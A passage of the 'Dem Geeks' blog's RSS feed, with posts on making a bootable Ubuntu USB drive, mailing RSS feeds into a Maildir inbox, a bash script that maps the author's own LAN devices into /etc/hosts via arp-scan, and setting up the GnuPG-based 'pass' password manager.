+<p><img data-attachment-id="754" data-permalink="https://demgeeks.com/eli5-boot-different-operating-system-bootable-usb-drive/boot-tab-bios-settings/" data-orig-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/boot-tab-bios-settings.jpg?fit=572%2C360&amp;ssl=1" data-orig-size="572,360" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="boot-tab-bios-settings" data-image-description="" data-medium-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/boot-tab-bios-settings.jpg?fit=300%2C189&amp;ssl=1" data-large-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/boot-tab-bios-settings.jpg?fit=572%2C360&amp;ssl=1" class="alignnone wp-image-754 size-full" src="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/boot-tab-bios-settings.jpg?resize=572%2C360&#038;ssl=1" alt="" srcset="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/boot-tab-bios-settings.jpg?w=572&amp;ssl=1 572w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/boot-tab-bios-settings.jpg?resize=300%2C189&amp;ssl=1 300w" sizes="(max-width: 572px) 100vw, 572px" data-recalc-dims="1" /></p>
+<p>This picture comes of a PC. Mac&#8217;s do also have a form of BIOS but it takes more tricks to get them to boot foreign storage devices.</p>
+<h2>Making a bootable USB drive</h2>
+<p>Boot your computer like normal, and you&#8217;ll see that, as long as there is not other device with a bootable signature plugged in, changing the boot order will make no difference.</p>
+<p>Now, there are many ways to make a bootable USB drive (or any storage medium), but the most user-friendly one is using a tool like <a href="https://unetbootin.github.io/">UNetbootin</a>. Click on the link and download it to your pc. It does not need admin rights so you can get it working on Windows, MacOS and Linux.</p>
+<p>Now, plug in a spare USB drive, and remember its name. Start UNetbootin and follow a couple of easy steps (which you can also find on the homepage). For this article we are going to use a pre-configured setting, built in in UNetbootin. You can supply your own .ISO file (a DVD disk file, preprogrammed to boot and possible install the operating system on another hard drive) but that is not what we are going to do in this article.</p>
+<p><strong>Select <a href="https://www.ubuntu.com/">Ubuntu </a>and select its latest version</strong>. Ubuntu is a linux-distribution which is made as user-friendly as possible. And it makes for an easy demonstration.</p>
+<p><img data-attachment-id="755" data-permalink="https://demgeeks.com/eli5-boot-different-operating-system-bootable-usb-drive/unetbootin-windows7/" data-orig-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/unetbootin-windows7.png?fit=549%2C399&amp;ssl=1" data-orig-size="549,399" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="unetbootin-windows7" data-image-description="" data-medium-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/unetbootin-windows7.png?fit=300%2C218&amp;ssl=1" data-large-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/unetbootin-windows7.png?fit=549%2C399&amp;ssl=1" class="alignnone wp-image-755 size-full" src="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/unetbootin-windows7.png?resize=549%2C399&#038;ssl=1" alt="" srcset="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/unetbootin-windows7.png?w=549&amp;ssl=1 549w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/unetbootin-windows7.png?resize=300%2C218&amp;ssl=1 300w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/unetbootin-windows7.png?resize=198%2C145&amp;ssl=1 198w" sizes="(max-width: 549px) 100vw, 549px" data-recalc-dims="1" /></p>
+<p>Select<strong> type: USB Drive</strong> and<strong> select the right drive!</strong> Please doublecheck this. So you don&#8217;t overwrite some important files. <strong>YOU WILL LOSE ALL DATA ON THE USB DRIVE!</strong></p>
+<p>When you checked your settings 3 times, <strong>hit OK.</strong></p>
+<p>The program will tell you when it&#8217;s done and you can eject your USB drive.</p>
+<h2>Booting the USB drive</h2>
+<p>Now plug in you USB drive, and reboot you pc. If you BIOS boot order is setup correctly and your drive is bootable. You&#8217;ll get a screen like this:</p>
+<p><img data-attachment-id="757" data-permalink="https://demgeeks.com/eli5-boot-different-operating-system-bootable-usb-drive/usb-boot-screen/" data-orig-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/USB-Boot-Screen.jpg?fit=720%2C400&amp;ssl=1" data-orig-size="720,400" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="USB-Boot-Screen" data-image-description="" data-medium-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/USB-Boot-Screen.jpg?fit=300%2C167&amp;ssl=1" data-large-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/USB-Boot-Screen.jpg?fit=640%2C356&amp;ssl=1" class="alignnone wp-image-757 size-full" src="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/USB-Boot-Screen.jpg?resize=640%2C356&#038;ssl=1" alt="" srcset="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/USB-Boot-Screen.jpg?w=720&amp;ssl=1 720w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/USB-Boot-Screen.jpg?resize=300%2C167&amp;ssl=1 300w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/USB-Boot-Screen.jpg?resize=640%2C356&amp;ssl=1 640w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" /></p>
+<p>Wait for the timer to time out or select &#8220;Try Ubuntu without installing&#8221;. Your Ubuntu installation will boot now! Do not install it, because you don&#8217;t want to overwrite your existing operating system. (you can even disconnect the cable to the other drive if you want).<br />
+Now you can try out a new operating system! In this &#8220;live&#8221; version of you operating system, everything that you do will be undone when you reboot your computer. You can not write to the USB drive. Have fun!</p>
+<p><em>REMINDER: Reversing this process is done by formatting the drive. This is different in every operating system, as always, for your specific system, just one Google search away.</em></p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/eli5-boot-different-operating-system-bootable-usb-drive/">ELI5: How to boot a different operating system with a bootable USB drive</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></content:encoded>
+			<wfw:commentRss>https://demgeeks.com/eli5-boot-different-operating-system-bootable-usb-drive/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">752</post-id>	</item>
+		<item>
+		<title>Get all your updates in your mailbox with RSS</title>
+		<link>https://demgeeks.com/get-all-your-updates-in-your-mailbox-with-rss/</link>
+		<comments>https://demgeeks.com/get-all-your-updates-in-your-mailbox-with-rss/#respond</comments>
+		<pubDate>Fri, 29 Sep 2017 10:11:30 +0000</pubDate>
+		<dc:creator><![CDATA[Lars Veelaert]]></dc:creator>
+				<category><![CDATA[Productivity]]></category>
+		<category><![CDATA[bash]]></category>
+		<category><![CDATA[cli]]></category>
+		<category><![CDATA[command-line]]></category>
+		<category><![CDATA[console. self-hosted. self-hosting. DIY]]></category>
+		<category><![CDATA[decentralization]]></category>
+		<category><![CDATA[development]]></category>
+		<category><![CDATA[diy]]></category>
+		<category><![CDATA[email]]></category>
+		<category><![CDATA[linux]]></category>
+		<category><![CDATA[mutt]]></category>
+		<category><![CDATA[networking]]></category>
+		<category><![CDATA[news]]></category>
+		<category><![CDATA[productivity]]></category>
+		<category><![CDATA[rss]]></category>
+		<category><![CDATA[terminal]]></category>
+		<category><![CDATA[tips]]></category>
+		<category><![CDATA[updates]]></category>
+
+		<guid isPermaLink="false">https://demgeeks.com/?p=733</guid>
+		<description><![CDATA[<p>So I have a couple sites I check regularly&#8230; YouTube, a couple blogs, Reddit-pages, LinkedIn and some news-sites. Often it happens that I miss some interesting article, or in general, I have to remember to check it. It&#8217;s not very productive to have the feeling you have to check everything, all the time. A good [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/get-all-your-updates-in-your-mailbox-with-rss/">Get all your updates in your mailbox with RSS</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></description>
+				<content:encoded><![CDATA[<p>So I have a couple sites I check regularly&#8230; YouTube, a couple blogs, Reddit-pages, LinkedIn and some news-sites. Often it happens that I miss some interesting article, or in general, I have to remember to check it. It&#8217;s not very productive to have the feeling you have to check everything, all the time.</p>
+<p>A good way to go about this is subscribing to newsletters and reviewing settings of your online accounts to have messages send to your mail inbox. Great, but not every simple site has this option and newsletters often are to bloated with ads and calls to action to be fun to read.</p>
+<p>I&#8217;ve wanted to solve this problem for quite a while but never found a good solution. My general philosophy is having everything on every device working in exactly the same way. I make sure I get a terminal on every device and from there I open my Linux environment with all my tools setup and synced.</p>
+<h2>And then I discovered RSS</h2>
+<p>Most sites today offer a RSS-feed. This is a file that resides somewhere on the domain (often linked somewhere on the homepage) and is a very simple XML file that has a summary of the meaningful changes to a site. Most engines like WordPress and Joomla have it by default. And any major site will support it (I havent found one that does not). Sometimes a Google-search is needed to find the right URL for sites like Reddit, but it&#8217;s (nearly) always there.</p>
+<h2>The problem</h2>
+<p>So if you have all your links of RSS-feeds, you can put them in a program that handles all the news for you. In the early days there was <a href="https://www.google.com/reader/about/">Google Reader</a> but that is gone right now (it did not fit the Google marketing anymore).There are apps like <a href="https://feedly.com/">Feedly</a> to replace it and many <a href="https://www.howtogeek.com/128487/the-best-free-rss-readers-for-keeping-up-with-your-favorite-websites/">others</a>.</p>
+<p>These are definitely great, but I don&#8217;t like standalone programs. I&#8217;d like my news to end up in my mailbox. I tried online RSS to Email converters like <a href="https://blogtrottr.com/">Blogtrottr</a> but never really liked it. It failed often and I had to go online and log in to add extra feeds. I also like to use as few resources or services as possible.</p>
+<p>Then local converters such as <a href="https://www.google.be/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=2&amp;cad=rja&amp;uact=8&amp;ved=0ahUKEwiBm8yikMrWAhWBCBoKHfDdDi0QFggwMAE&amp;url=http%3A%2F%2Fnewspipe.sourceforge.net%2F&amp;usg=AFQjCNEANFszQVtDJDB4BQN6CgfnLXsc4w">newspipe</a> and <a href="http://www.allthingsrss.com/rss2email/">rss2email</a> got my attention but they are the main page was down and rss2email needed a specific format to read the links from and would write my mails into an incompatible and older version of mailbox.</p>
+<h2>The DIY fix</h2>
+<p>So I realized <a href="http://www.allthingsrss.com/rss2email/">rss2email </a>was written in Python (Yes!) and most of its heavy-lifting was done by a module called &#8220;feedparser&#8221;. So I wrote my own script to take a list of URL&#8217;s (of rss-feeds) and add them my local inbox in Maildir-format (I use the terminal application <a href="https://nl.wikipedia.org/wiki/Mutt">mutt</a> for my email). Many email-programs use this standardized format so research if yours is compatible. If you want to read a great article on how to set up Mutt I recommend <a href="https://wiki.archlinux.org/index.php/mutt">this Arch Linux post </a>and <a href="http://stevelosh.com/blog/2012/10/the-homely-mutt/">The Homely Mutt</a>.</p>
+<p><img data-attachment-id="739" data-permalink="https://demgeeks.com/get-all-your-updates-in-your-mailbox-with-rss/screenshot_2017-09-29_12-09-28/" data-orig-file="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-29_12-09-28.png?fit=970%2C185&amp;ssl=1" data-orig-size="970,185" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot_2017-09-29_12-09-28" data-image-description="" data-medium-file="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-29_12-09-28.png?fit=300%2C57&amp;ssl=1" data-large-file="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-29_12-09-28.png?fit=640%2C122&amp;ssl=1" class="alignnone wp-image-739 size-full" src="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-29_12-09-28.png?resize=640%2C122&#038;ssl=1" alt="" srcset="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-29_12-09-28.png?w=970&amp;ssl=1 970w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-29_12-09-28.png?resize=300%2C57&amp;ssl=1 300w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-29_12-09-28.png?resize=768%2C146&amp;ssl=1 768w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-29_12-09-28.png?resize=640%2C122&amp;ssl=1 640w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" /></p>
+<p>So this is the command you can add to a macro or <a href="https://demgeeks.com/qt-make-the-command-line-easier-with-aliases-and-functions/">alias</a> to fetch the feeds form the <em>rss.txt</em> file in the <em>~/RSS/</em> directory and parse them offline into emails which will be added to the <em>~/MAILDIR/account/INBOX</em></p>
+<pre>python ~/rss2maildir.py ~/RSS ~/MAILDIR/account/INBOX</pre>
+<p><img data-attachment-id="742" data-permalink="https://demgeeks.com/get-all-your-updates-in-your-mailbox-with-rss/screenshot_2017-09-29_12-12-37/" data-orig-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-29_12-12-37.png?fit=734%2C177&amp;ssl=1" data-orig-size="734,177" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot_2017-09-29_12-12-37" data-image-description="" data-medium-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-29_12-12-37.png?fit=300%2C72&amp;ssl=1" data-large-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-29_12-12-37.png?fit=640%2C154&amp;ssl=1" class="alignnone wp-image-742 size-full" src="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-29_12-12-37.png?resize=640%2C154&#038;ssl=1" alt="" srcset="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-29_12-12-37.png?w=734&amp;ssl=1 734w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-29_12-12-37.png?resize=300%2C72&amp;ssl=1 300w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-29_12-12-37.png?resize=640%2C154&amp;ssl=1 640w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" /></p>
+<p>You can find the script and an example rss.txt in <a href="https://github.com/polarsbear/rss2maildir">this Github-repo</a>. Feel free to give tips and share your experiences!</p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/get-all-your-updates-in-your-mailbox-with-rss/">Get all your updates in your mailbox with RSS</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></content:encoded>
+			<wfw:commentRss>https://demgeeks.com/get-all-your-updates-in-your-mailbox-with-rss/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">733</post-id>	</item>
+		<item>
+		<title>Quick Tip: A script to resolve local network hostnames without extra services (Linux)</title>
+		<link>https://demgeeks.com/quick-tip-script-resolve-local-network-hostnames-without-extra-services/</link>
+		<comments>https://demgeeks.com/quick-tip-script-resolve-local-network-hostnames-without-extra-services/#respond</comments>
+		<pubDate>Wed, 27 Sep 2017 11:08:03 +0000</pubDate>
+		<dc:creator><![CDATA[Lars Veelaert]]></dc:creator>
+				<category><![CDATA[Quick Tips]]></category>
+		<category><![CDATA[anonimity]]></category>
+		<category><![CDATA[command-line]]></category>
+		<category><![CDATA[decentralization]]></category>
+		<category><![CDATA[dns]]></category>
+		<category><![CDATA[git]]></category>
+		<category><![CDATA[hostname]]></category>
+		<category><![CDATA[ip]]></category>
+		<category><![CDATA[linux]]></category>
+		<category><![CDATA[mac]]></category>
+		<category><![CDATA[networking]]></category>
+		<category><![CDATA[resolve]]></category>
+		<category><![CDATA[ssh server]]></category>
+		<category><![CDATA[terminal]]></category>
+		<category><![CDATA[tips]]></category>
+
+		<guid isPermaLink="false">https://demgeeks.com/?p=717</guid>
+		<description><![CDATA[<p>I was in desperate need to find a way to not always have to scan the network or go over to another device to know its IP so I could ssh into it or use a service it was serving. This is what I found. The internet is just a lot of devices, which can [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/quick-tip-script-resolve-local-network-hostnames-without-extra-services/">Quick Tip: A script to resolve local network hostnames without extra services (Linux)</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></description>
+				<content:encoded><![CDATA[<p>I was in desperate need to find a way to not always have to scan the network or go over to another device to know its IP so I could ssh into it or use a service it was serving. This is what I found.</p>
+<p>The internet is just a lot of devices, which can be addressed with an <a href="https://en.wikipedia.org/wiki/IP_address">IP address</a>. Those are unique in every network. To make the network more usable we use <a href="https://en.wikipedia.org/wiki/Domain_name">domain names </a>with logical, easy to remember names like www.google.com or www.facebook.com.</p>
+<p>This works by contactin a server with a fixed IP which provides <a href="https://nl.wikipedia.org/wiki/Domain_Name_System">DNS</a> that resolves your domain name in an IP that your browser can go to. DNS-servers for the global internet are managed by governments and maintained by big companies like Google. This is why, If you want a domain name, it comes with a fee&#8230;</p>
+<p>On local networks, its overkill (and quite some setup) to have a <a href="https://www.lifewire.com/what-is-a-dns-server-2625854">DNS-server</a> to resolve the IP of devices but other programs like <a href="https://nl.wikipedia.org/wiki/Zeroconf">zeroconf</a> and <a href="https://en.wikipedia.org/wiki/Multicast_DNS">mdns</a> tried to have a more low-maintenance take on this problem. Short story: Still not ideal. You still have to have services running on all devices to ensure that your device gets registered&#8230;</p>
+<h2>The solution</h2>
+<p>The ideal solution consists of:<br />
+&#8211; No changes needed to the network (so it works everywhere)<br />
+&#8211; Reliable<br />
+&#8211; Very little setup on the device itself and no services need to be running<br />
+&#8211; Cross-platform</p>
+<p>The idea is to maintain a list of<a href="https://en.wikipedia.org/wiki/MAC_address"> MAC-addresses</a> of the devices I use (and sync those with <a href="https://www.dropbox.com/">Dropbox</a> or <a href="https://git-scm.com/">Git</a>), scan the network for these <a href="https://en.wikipedia.org/wiki/MAC_address">MAC-addresses</a> and if found, add them to the /etc/hosts file. This is reliable because MAC-addresses are hard-coded in your hardware. You only need to know the MAC of your other devices and you can identify it. Every device has to have one. Adding to the /etc/hosts file is something that is supported by the core of linux so it is quite cross-platform on any device you can get linux working on.</p>
+<p>So whenever my network-setup changes, or it has been a while and adresses may have switched, I run the following command;</p>
+<pre>bash ./HOSTS.sh ./HOSTS_MACS</pre>
+<p><strong>HOSTS.sh script:</strong></p>
+<pre>#DEPENDENCIES: arp-scan
+#take $1 (first argument of the script) -&gt; file with mac adresses + hostname
+
+tmpfile=$(mktemp /tmp/DYNAMIC-RESOLVE.XXXXXX) #tmp file for temporary results
+
+#clear lines form the previous run in /etc/hosts file
+sed -i.bak '/DYNAMIC_RESOLVE/d' /etc/hosts
+
+#use the tool arp-scan to find all the devices on the network
+if ! [ -z $2 ]; then
+ arp-scan -l --localnet --interface=$2 &gt;&gt; $tmpfile
+else
+ for line in $(ip link | cut -d " " -f 2); do
+ interface=${line::-1}
+ arp-scan -l --localnet --interface=$interface 2&gt;/dev/null &gt;&gt; $tmpfile
+ done
+ #TODO interfaceoption -&gt; default wlan
+fi
+echo Arpscan Finished... Filtering results...
+
+#reading the results one by one
+while read -r line
+do
+ MAC=$(echo $line | cut -d " " -f 1)
+ NAME=$(echo $line | cut -d " " -f 2)
+ #grep MAC from ARP cache
+ IP=$(cat $tmpfile | grep $MAC | cut -d$'\t' -f 1)
+
+if ! [ -z "${IP}" ]; then
+ echo Found $NAME at $IP! Adding to /etc/hosts...
+ echo "$IP $NAME $NAME #DYNAMIC_RESOLVE"&gt;&gt;/etc/hosts #If the MAC is found, add to the /etc/hosts file
+ fi 
+done &lt; "$1"
+echo Done with discovering hosts</pre>
+<p><strong>HOSTS_MACS file:</strong></p>
+<pre>00:90:f5:d6:5b:05 c1
+c0:ee:fb:59:fc:23 s1
+10:02:b5:d6:08:8a o1
+b8:27:eb:4e:0c:42 kh1</pre>
+<p>The second file is just a list of MAC-addresses with a name you chose behind it. You can find your MAC-address in various ways, but the easiest is just running the ifconfig command on linux. (look next to &#8220;ether&#8221;)</p>
+<p><img data-attachment-id="720" data-permalink="https://demgeeks.com/quick-tip-script-resolve-local-network-hostnames-without-extra-services/screenshot_2017-09-27_13-17-14/" data-orig-file="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-27_13-17-14.png?fit=812%2C199&amp;ssl=1" data-orig-size="812,199" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot_2017-09-27_13-17-14" data-image-description="" data-medium-file="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-27_13-17-14.png?fit=300%2C74&amp;ssl=1" data-large-file="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-27_13-17-14.png?fit=640%2C157&amp;ssl=1" class="alignnone wp-image-720 size-full" src="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-27_13-17-14.png?resize=640%2C157&#038;ssl=1" alt="" srcset="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-27_13-17-14.png?w=812&amp;ssl=1 812w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-27_13-17-14.png?resize=300%2C74&amp;ssl=1 300w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-27_13-17-14.png?resize=768%2C188&amp;ssl=1 768w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/09/Screenshot_2017-09-27_13-17-14.png?resize=640%2C157&amp;ssl=1 640w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" /></p>
+<p>You will need the tool arp-scan to run this script, you can find it in nearly all repositories. I run this script on an android phone, a desktop, chromebook and Raspberry Pi. So no worries.</p>
+<p>If you check the /etc/hosts file you can see the following has changed:</p>
+<pre>#
+# /etc/hosts: static lookup table for host names
+#
+
+#&lt;ip-address&gt; &lt;hostname.domain.org&gt; &lt;hostname&gt;
+127.0.0.1 localhost.localdomain localhost
+::1 localhost.localdomain localhost
+
+# End of file
+192.168.1.3 s1 s1 #DYNAMIC_RESOLVE
+192.168.1.2 kh1 kh1 #DYNAMIC_RESOLVE</pre>
+<p>You can now use the hostnames in most commands and have them automatically resolved;</p>
+<pre>ssh s1 #resolves to the IP adress of my phone
+ssh root@kh1 -p 22 #same but with more arguments</pre>
+<p>You can<a href="https://demgeeks.com/qt-make-the-command-line-easier-with-aliases-and-functions/"> alias the HOSTS.sh script command in you bashrc</a> to make it easier to use. That&#8217;s it! have fun!</p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/quick-tip-script-resolve-local-network-hostnames-without-extra-services/">Quick Tip: A script to resolve local network hostnames without extra services (Linux)</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></content:encoded>
+			<wfw:commentRss>https://demgeeks.com/quick-tip-script-resolve-local-network-hostnames-without-extra-services/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">717</post-id>	</item>
+		<item>
+		<title>Quick Tip: GnuPG-based password manager (Linux)</title>
+		<link>https://demgeeks.com/quick-tip-gnupg-based-password-manager/</link>
+		<comments>https://demgeeks.com/quick-tip-gnupg-based-password-manager/#respond</comments>
+		<pubDate>Sat, 23 Sep 2017 11:09:21 +0000</pubDate>
+		<dc:creator><![CDATA[Lars Veelaert]]></dc:creator>
+				<category><![CDATA[Quick Tips]]></category>
+		<category><![CDATA[anonimity]]></category>
+		<category><![CDATA[bash]]></category>
+		<category><![CDATA[command-line]]></category>
+		<category><![CDATA[encryption]]></category>
+		<category><![CDATA[linux]]></category>
+		<category><![CDATA[productivity]]></category>
+		<category><![CDATA[security]]></category>
+		<category><![CDATA[terminal]]></category>
+		<category><![CDATA[tips]]></category>
+
+		<guid isPermaLink="false">http://www.demgeeks.com/?p=134</guid>
+		<description><![CDATA[<p>In this article we will setup a secure password manager. You probably use the same password over and over again on multiple sites/devices/applications. Not so great! If one service gets compromised, an attacker can wreak some serious havoc. YOU SHOULD USE DIFFERENT PASSWORDS! But this is hard, so many store their passwords in a passwords.txt [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/quick-tip-gnupg-based-password-manager/">Quick Tip: GnuPG-based password manager (Linux)</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></description>
+				<content:encoded><![CDATA[<p>In this article we will setup a secure password manager. You probably use the same password over and over again on multiple sites/devices/applications. Not so great! If one service gets compromised, an attacker can wreak some serious havoc. <strong>YOU SHOULD USE DIFFERENT PASSWORDS!</strong><br />
+But this is hard, so many store their passwords in a passwords.txt file on their desktop, or even better, in a service like Dropbox storing all passwords together and keeping that file synced. Copying passwords will also circumvent <a href="https://en.wikipedia.org/wiki/Keystroke_logging">keyloggers</a> active on your system. So awesome right?!</p>
+<p>Not really, If one of your devices gets compromised, or Dropbox makes a mistake, you are screwed. You should still have an extra layer of access protection between the file and the passwords, syncing with Dropbox can be fine, but you have to encrypt the file.</p>
+<h2>About password managers</h2>
+<p>One option is using tools like <a href="http://keepass.info/">Keepass</a> or <a href="https://1password.com/">1Password</a>. But you are depending on that service, its not modular (you can not choose the way it gets synced). I don&#8217;t like trusting these services. Not only the communication but things like encryption type, memory leaks, temporary files can all be badly designed. <a href="https://www.coredna.com/blogs/comparing-open-closed-source-software">Open-source</a> tools are the way to go, because you can trust AND verify.</p>
+<p>The best way to do this is with <a href="https://en.wikipedia.org/wiki/Public-key_cryptography">asymmetric encryption</a>. Their are standards such as<a href="https://nl.wikipedia.org/wiki/Pretty_Good_Privacy"> PGP </a>(<a href="https://www.gnupg.org/">GnuPG</a> on linux) who make this easy. The encryption is very strong because you use a long encryption key, to decrypt your target file.<br />
+The long encryption key is stored locally on your machines, and you need a passphrase to use it. So even if the can get access to the long secure encryption key (private key). They will still need the passphrase.</p>
+<p>This is not all that <a href="https://www.gnupg.org/">GnuPG</a> can do, it is an amazing piece of work, if interested, you should check it out. A nice place to get started with using it is this <a href="https://wiki.archlinux.org/index.php/GnuPG">Arch Linux page</a> about GnuPG.</p>
+<p>I use the terminal everywhere and there is a cli-tool named <a href="https://wiki.archlinux.org/index.php/Pass">pass </a>to automate the usage of GnuPG for passwords. We will use that to manage our passwords.</p>
+<h2>Dependencies</h2>
+<p>You first have to install pass and GnuPG and more important, set up GnuPG and have it make a key for you (you can of course use an already existing key, but then you would not be reading this). Do what is right on your system:</p>
+<p><strong>Debian-based;</strong></p>
+<pre>sudo apt-get install pass gnupg</pre>
+<p><strong>Arch Linux; </strong></p>
+<pre>sudo pacman -Sy pass gnupg</pre>
+<p>The cool thing about the pass password-manager, is its cross platform uniform behavior. You know how to use it on one platform and you know it on all your other devices (more on syncing the passwords later)</p>
+<h2>Setup your encryption key</h2>
+<pre>gpg --full-gen-key</pre>
+<p>Now gpg will ask you a couple questions, like what kind of key you want, press 1.<br />
